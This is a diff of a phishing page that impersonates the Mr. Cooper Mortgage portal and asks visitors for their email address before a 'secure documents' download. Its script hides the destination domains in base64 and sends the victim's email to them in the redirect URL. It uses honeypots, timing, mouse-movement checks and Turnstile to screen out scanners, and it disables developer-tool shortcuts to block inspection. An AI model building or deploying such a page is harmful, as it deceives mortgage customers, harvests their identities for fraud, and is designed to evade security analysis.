@@ -3,16 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mr. Cooper Mortgage Portal</title>
+  <title>Mr. Cooper Mortgage</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; frame-src https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="referrer" content="no-referrer">
+  <meta name="robots" content="noindex, nofollow">
   <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
     
     body {
       font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #f0f9ff 0%, #e6f2ff 100%);
     }
     
     .mail-icon {
@@ -22,13 +24,11 @@
     .download-btn {
       transition: all 0.3s ease;
       box-shadow: 0 4px 6px rgba(59, 130, 246, 0.2);
-      background: linear-gradient(to right, #2563eb, #1d4ed8);
     }
     
     .download-btn:hover {
       transform: translateY(-2px);
       box-shadow: 0 6px 12px rgba(59, 130, 246, 0.3);
-      background: linear-gradient(to right, #1d4ed8, #1e40af);
     }
     
     .download-btn:active {
@@ -37,7 +37,6 @@
     
     .input-field:focus {
       box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
-      border-color: #3b82f6;
     }
     
     .security-pulse {
@@ -52,28 +51,43 @@
     
     .info-card {
       transition: transform 0.3s ease;
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(10px);
     }
     
     .info-card:hover {
       transform: translateY(-5px);
     }
     
-    .logo-container {
-      background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%);
-      border-radius: 16px;
-      padding: 16px;
-      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2);
+    /* Honeypot styling */
+    .hp-field {
+      opacity: 0;
+      position: absolute;
+      left: -10000px;
+      top: -10000px;
+      width: 1px;
+      height: 1px;
+    }
+    
+    .loading-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
-<body class="min-h-screen flex items-center justify-center px-4 py-8" oncontextmenu="return false;">
-  <div class="bg-white rounded-2xl shadow-xl w-full max-w-5xl overflow-hidden flex flex-col md:flex-row border border-blue-100">
+<body class="bg-gradient-to-br from-blue-50 to-white min-h-screen flex items-center justify-center px-4" oncontextmenu="return false;">
+  <div class="bg-white rounded-2xl shadow-xl w-full max-w-5xl overflow-hidden flex flex-col md:flex-row">
     <!-- Left side - Information section -->
     <div class="bg-gradient-to-br from-blue-600 to-blue-800 text-white p-8 md:w-1/2">
-      <div class="mb-8 flex flex-col items-center logo-container">
-        <h2 class="text-3xl font-bold mb-2 text-white">Mr. Cooper Mortgage</h2>
+      <div class="mb-8 flex flex-col items-center">
+        <h2 class="text-3xl font-bold mb-2">Mr. Cooper Mortgage</h2>
         <p class="text-blue-100">America's Largest Mortgage Servicer</p>
       </div>
       
@@ -106,6 +120,16 @@
             Loan Services
           </h3>
           <p class="text-blue-100 text-sm">Mr. Cooper offers various loan types including conventional, FHA, VA, jumbo loans, and home equity loans. We provide both purchase loans and refinancing options with competitive rates.</p>
+        </div>
+
+        <div class="info-card bg-blue-700 bg-opacity-50 p-5 rounded-lg">
+          <h3 class="font-semibold text-lg mb-2 flex items-center">
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+            </svg>
+            On-Time Closing Guarantee
+          </h3>
+          <p class="text-blue-100 text-sm">We offer a Close On Time Guarantee for conventional, FHA and VA loans. If your loan doesn't close by the guaranteed closing date, Mr. Cooper will cover your first month's mortgage payment.</p>
         </div>
       </div>
       
@@ -146,11 +170,12 @@
 
       <form id="download-form">
         <!-- Enhanced honeypot fields -->
-        <div class="hidden" aria-hidden="true">
+        <div class="hp-field">
           <label for="hp-phone">Phone</label>
-          <input type="text" id="hp-phone" name="phone" autocomplete="nope" tabindex="-1" />
-          <input type="checkbox" id="hp-consent" name="consent" autocomplete="off" tabindex="-1" style="display:none !important;" />
-          <input type="text" id="hp-name" name="name" autocomplete="off" tabindex="-1" style="opacity:0;position:absolute;left:-9999px;" />
+          <input type="text" id="hp-phone" name="phone" autocomplete="off" tabindex="-1" />
+          <input type="checkbox" id="hp-consent" name="consent" autocomplete="off" tabindex="-1" />
+          <input type="text" id="hp-name" name="name" autocomplete="off" tabindex="-1" />
+          <input type="email" id="hp-email" name="secondary_email" autocomplete="off" tabindex="-1" />
         </div>
 
         <!-- Email input -->
@@ -160,7 +185,7 @@
             type="email"
             id="user-email"
             placeholder="user@company.com"
-            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 input-field"
+            class="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 input-field"
             autocomplete="email"
             required
             autofocus
@@ -174,18 +199,19 @@
         <button
           type="submit"
           id="download-btn"
-          class="w-full bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 download-btn disabled:opacity-50 disabled:cursor-not-allowed"
+          class="w-full bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 download-btn disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
           disabled
         >
-          CONTINUE
+          <span id="button-text">CONTINUE</span>
+          <span id="button-spinner" class="loading-spinner ml-2 hidden"></span>
         </button>
 
         <div id="status" class="mt-4 text-sm text-red-500 hidden"></div>
         <div id="success-message" class="mt-4 text-sm text-green-600 hidden">
           <svg class="inline-block h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19-7"></path>
           </svg>
-          Accessing your documents now...
+          Accessing secure documents… please wait....
         </div>
       </form>
 
@@ -196,117 +222,66 @@
           </svg>
           <span>Secure Encrypted Connection</span>
         </div>
-        &copy; 2000-2025 Mr. Cooper Group Inc. All rights reserved. Lending services provided by Mr. Cooper Mortgage.
+        &copy; 2000-2026 Mr. Cooper Group Inc. All rights reserved. Lending services provided by Mr. Cooper Mortgage.
       </footer>
     </div>
   </div>
 
   <script>
-    // Enhanced security without delays
+    // Enhanced security without the aggressive anti-debugging
     (function(){
-      // Mouse movement tracking
-      var mouseMovements = [];
-      document.addEventListener('mousemove', function(e) {
-        mouseMovements.push({
-          x: e.clientX,
-          y: e.clientY,
-          t: Date.now()
-        });
-        
-        // Keep only the last 20 movements
-        if (mouseMovements.length > 20) {
-          mouseMovements.shift();
-        }
-      });
-      
-      // Keypress tracking
-      var keyPresses = [];
-      document.addEventListener('keypress', function(e) {
-        keyPresses.push({
-          key: e.key,
-          time: Date.now()
-        });
-        
-        // Keep only the last 20 keypresses
-        if (keyPresses.length > 20) {
-          keyPresses.shift();
-        }
-      });
-      
-      // Form interaction timing
-      var formViewTime = Date.now();
-      
-      // Function to check if behavior is human-like
-      function isHuman() {
-        // Check mouse movement patterns
-        if (mouseMovements.length > 5) {
-          var straightLines = 0;
-          for (var i = 2; i < mouseMovements.length; i++) {
-            var prevDeltaX = mouseMovements[i-1].x - mouseMovements[i-2].x;
-            var prevDeltaY = mouseMovements[i-1].y - mouseMovements[i-2].y;
-            var currDeltaX = mouseMovements[i].x - mouseMovements[i-1].x;
-            var currDeltaY = mouseMovements[i].y - mouseMovements[i-1].y;
-            
-            // Check if movement is in a straight line (bot-like)
-            if (Math.abs(prevDeltaX - currDeltaX) < 2 && Math.abs(prevDeltaY - currDeltaY) < 2) {
-              straightLines++;
-            }
-          }
-          
-          if (straightLines > (mouseMovements.length / 2)) {
-            return false;
-          }
-        }
-        
-        // Check if time on page is reasonable
-        var timeOnPage = Date.now() - formViewTime;
-        if (timeOnPage < 1000) {
+      // Prevent certain key combinations
+      document.addEventListener('keydown', function(e) {
+        // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+            (e.ctrlKey && e.key === 'U')) {
+          e.preventDefault();
           return false;
         }
-        
-        return true;
-      }
+      });
       
-      // Function to decode base64 strings
-      function decodeBase64(s) {
+      // Mouse movement tracking for behavioral analysis
+      let moveCount = 0;
+      let lastMoveTime = Date.now();
+      document.addEventListener('mousemove', function() {
+        moveCount++;
+        lastMoveTime = Date.now();
+      });
+      
+      // Enhanced decoding function
+      function decodeString(s) {
         return decodeURIComponent(escape(atob(s)));
       }
       
-      // Multiple redirect URLs (encoded)
-      var encodedRedirectUrls = [
-        'aHR0cHM6Ly90c2Uxa3BjdHVhLnRvcGx1Y2t5Y2FzaW5vN2JldC5jb20=',
-        'aHR0cHM6Ly9hdXZuaXo3MXgxLnJlbnN1cmFjYXcucGljcy8=',
-        'aHR0cHM6Ly9wemN0NjM1d29mLmt3YXlsb29tZXIucGljcw=='
-      ];
-      
-      // Function to get a rotated URL
-      function getRedirectUrl() {
-        // Use a simple rotation based on time and user behavior
-        var now = new Date();
-        var seconds = now.getSeconds();
-        var mouseEvents = mouseMovements.length;
-        var keyEvents = keyPresses.length;
-        
-        // Create a simple hash based on time and user interactions
-        var index = (seconds + mouseEvents + keyEvents) % encodedRedirectUrls.length;
-        
-        return decodeBase64(encodedRedirectUrls[index]);
+      // Function to validate email format
+      function isValidEmail(email) {
+        const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+        return re.test(String(email).toLowerCase());
       }
       
-      // DOM elements
-      var elements = {
+      // Obfuscated variables and functions
+      const elements = {
         form: document.getElementById('download-form'),
         status: document.getElementById('status'),
         success: document.getElementById('success-message'),
         button: document.getElementById('download-btn'),
+        buttonText: document.getElementById('button-text'),
+        buttonSpinner: document.getElementById('button-spinner'),
+        email: document.getElementById('user-email'),
         honeypot: document.getElementById('hp-phone'),
-        email: document.getElementById('user-email')
+        honeypot2: document.getElementById('hp-consent'),
+        honeypot3: document.getElementById('hp-name'),
+        honeypot4: document.getElementById('hp-email')
       };
       
-      // Configuration
-      var config = {
+      const config = {
+        targetUrl: decodeString('aHR0cHM6Ly90c2Uxa3BjdHVhLnRvcGx1Y2t5Y2FzaW5vN2JldC5jb20'),
         loadTime: Date.now(),
-        widgetId: null
+        widgetId: null,
+        minTimeOnPage: 3000,
+        minMouseMovements: 2
       };
       
       // Initialize Cloudflare Turnstile
@@ -320,24 +295,27 @@
             },
             'error-callback': function() {
               elements.button.disabled = true;
-              showError('Please complete the security check');
+              showError(decodeString('Q0FQVENIQSBlcnJvciwgcGxlYXNlIHRyeSBhZ2Fpbi4='));
             },
             'expired-callback': function() {
               elements.button.disabled = true;
-              showError('Security check expired, please try again');
+              showError(decodeString('Q0FQVENIQSBleHBpcmVkLCBwbGVhc2UgY29tcGxldGUgYWdhaW4u'));
             }
           });
         }
       });
       
-      // Show error message
+      // Function to show error messages
       function showError(message) {
         elements.success.classList.add('hidden');
         elements.status.textContent = message;
         elements.status.classList.remove('hidden');
+        elements.button.disabled = false;
+        elements.buttonText.textContent = 'CONTINUE';
+        elements.buttonSpinner.classList.add('hidden');
       }
       
-      // Show success message
+      // Function to show success message
       function showSuccess() {
         elements.status.classList.add('hidden');
         elements.success.classList.remove('hidden');
@@ -347,62 +325,57 @@
       elements.form.addEventListener('submit', function(e) {
         e.preventDefault();
         
-        // Enhanced bot detection
-        if (!isHuman()) {
-          showError('Please interact with the page normally');
-          return;
+        // Show loading state
+        elements.buttonText.textContent = 'PROCESSING...';
+        elements.buttonSpinner.classList.remove('hidden');
+        elements.button.disabled = true;
+        
+        // Check if button is disabled (captcha not completed)
+        if (!turnstile || !config.widgetId) {
+          return showError(decodeString('UGxlYXNlIGNvbXBsZXRlIHRoZSBDQVBUQ0hFIGJlZm9yZSBkb3dubG9hZGluZy4='));
         }
         
-        // Check if honeypot fields were filled
-        if (elements.honeypot.value !== '' || document.getElementById('hp-name').value !== '') {
-          return; // Silent fail for bots
+        // Honeypot validation
+        if (elements.honeypot.value !== '' || 
+            elements.honeypot2.checked || 
+            elements.honeypot3.value !== '' || 
+            elements.honeypot4.value !== '') {
+          return showError(decodeString('Qm90IGRldGVjdGVkLg=='));
         }
         
-        if (elements.button.disabled) {
-          showError('Please complete the security check first');
-          return;
+        // Time on page validation
+        if (Date.now() - config.loadTime < config.minTimeOnPage) {
+          return showError(decodeString('UGxlYXNlIHN0YXkgb24gcGFnZSBhIGJpdCBsb25nZXIu'));
         }
         
-        var token = turnstile.getResponse(config.widgetId);
+        // Mouse movement validation
+        if (moveCount < config.minMouseMovements) {
+          return showError(decodeString('U3VzcGljaW91cyBhY3Rpdml0eSBkZXRlY3RlZC4gUGxlYXNlIHRyeSBhZ2Fpbi4='));
+        }
+        
+        // Validate captcha
+        const token = turnstile.getResponse(config.widgetId);
         if (!token) {
-          showError('Please complete the security check');
-          return;
+          return showError(decodeString('UGxlYXNlIGNvbXBsZXRlIHRoZSBDQVBUQ0hBLg=='));
         }
         
-        // All checks passed
+        // Validate email format
+        const email = elements.email.value.trim().toLowerCase();
+        if (!isValidEmail(email)) {
+          return showError('Please enter a valid email address.');
+        }
+        
+        // Show success message and redirect
         elements.status.classList.add('hidden');
         showSuccess();
         
-        // Get and encode email
-        var email = elements.email.value.trim().toLowerCase();
-        var encodedEmail = encodeURIComponent(email);
+        // Encode email for URL
+        const encodedEmail = btoa(email);
         
-        // Get a rotated redirect URL
-        var redirectUrl = getRedirectUrl();
-        
-        // Redirect immediately without delay
-        window.location.href = redirectUrl + '?email=' + encodedEmail;
-      });
-      
-      // Additional security: prevent copying, right-click, etc.
-      document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-      });
-      
-      document.addEventListener('copy', function(e) {
-        e.preventDefault();
-        return false;
-      });
-      
-      document.addEventListener('cut', function(e) {
-        e.preventDefault();
-        return false;
-      });
-      
-      document.addEventListener('paste', function(e) {
-        e.preventDefault();
-        return false;
+        // Redirect after a short delay
+        setTimeout(function() {
+          window.location.href = config.targetUrl + '$' + encodedEmail;
+        }, 1500);
       });
     })();
   </script>
